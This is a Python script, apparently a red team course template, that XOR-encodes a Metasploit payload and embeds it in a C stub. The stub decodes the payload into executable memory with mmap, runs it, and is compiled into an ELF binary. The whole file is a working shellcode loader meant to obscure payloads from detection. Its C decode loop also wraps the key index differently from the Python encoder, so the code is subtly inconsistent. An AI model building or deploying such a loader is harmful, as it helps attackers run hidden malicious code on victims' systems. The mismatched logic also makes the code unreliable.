# Red Team Operator course code template
# payload encryption with XOR
#
# author: reenz0h (twitter: @sektor7net)

import os
import sys
import struct
import argparse
import subprocess
from binascii import hexlify, unhexlify

KEY = "Microsoft"

TEMP="/tmp/inject.c"

PLACEHOLDER = "####SHELLCODE####"

TEMPLATE = r"""
//gcc -m32 file.c (32-bit)
//gcc file.c (64-bit)
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

char key [] = "Microsoft";

unsigned char bytes[] = ####SHELLCODE####;


void XOR(char * books, size_t data_len, char * pey, size_t book_len) {
    int k;
    
    k = 0;
    for (int i = 0; i < data_len; i++) {
        if (k == book_len - 1) k = 0;

        books[i] = books[i] ^ pey[k];
        k++;
    }
}

int main() {
    
    XOR((char *) bytes, sizeof(bytes), key, sizeof(key));

    void* region = mmap(NULL, 
            sizeof(bytes),
            PROT_WRITE | PROT_EXEC,
            MAP_ANONYMOUS | MAP_PRIVATE,
            -1,
            0);

    if(region == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    memcpy(region, bytes, sizeof(bytes));

    printf("executing %ld bytes shellcode using mmap system call\n", sizeof(bytes));
    ((int(*)())region)();

    //unreachable code
    munmap(region, sizeof(bytes));
    return 0;
}

"""

def xor(data, key):
    encoded = b""
    key = bytes(key, 'utf-8')
    if isinstance(data, str):
        data = bytes(data, 'utf-8')
    for i in range(len(data)):
        encoded += struct.pack("B", (data[i] ^ (key[i % len(key)])))
    
    return encoded

def generate(shellcode):
    content = TEMPLATE
    with open(TEMP, "w") as sourcefile:
        content = content.replace(PLACEHOLDER, shellcode)
        sourcefile.write(content)

def compile(out=None, arch="x64"):
    cmd = "gcc "
    if arch == "x86":
        cmd += "-m32 "
    if out:
        cmd += f"-o {out} "
    cmd += TEMP
    try:
        output = subprocess.check_output(cmd, shell=True)
    except Exception as e:
        print("[-] Error during compilation")
        print(e)

def formatted_ciphertext(ciphertext):
    ciphertext = hexlify(ciphertext).decode()
    return '{ 0x' + ', 0x'.join(ciphertext[i:i+2] for i in range(0, len(ciphertext), 2)) + ' }'


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Linux Shellcode Execution Payload Generator")
    
    parser.add_argument("-p", "--payload", type=str, required=True, help="Metasploit payload")
    parser.add_argument("-a", "--arch", choices=["x64", "x86"], default="x64", help="Metasploit payload architecture")
    parser.add_argument("-o", "--outfile", type=str, default="inject.elf", required=False, help="Output file name")
    args = parser.parse_args()
    
    if not os.path.isfile(args.payload):
        print("[-] Error, Metasploit payload not found")
        sys.exit(1)
    print("[+] Encoding payload")
    plaintext = open(args.payload, "rb").read()
    ciphertext = xor(plaintext, KEY)
    print("[+] Generating injector stub")
    shellcode = formatted_ciphertext(ciphertext)
    generate(shellcode)
    print(f"[+] Compiling to {args.outfile}")
    compile(out=args.outfile, arch=args.arch)
    print("[+] Done")

#print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
